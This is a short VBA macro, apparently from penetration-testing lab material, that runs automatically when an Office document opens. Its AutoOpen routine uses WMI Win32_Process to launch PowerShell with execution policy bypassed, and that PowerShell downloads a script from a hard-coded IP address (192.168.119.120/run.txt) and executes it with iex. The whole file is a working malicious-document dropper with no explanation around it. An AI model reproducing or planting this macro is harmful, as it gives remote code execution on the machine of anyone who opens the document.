' Uses WMI Win32_Process to create a new process with the value of "Argument"
Sub MyMacro
  Argument = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create Argument, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
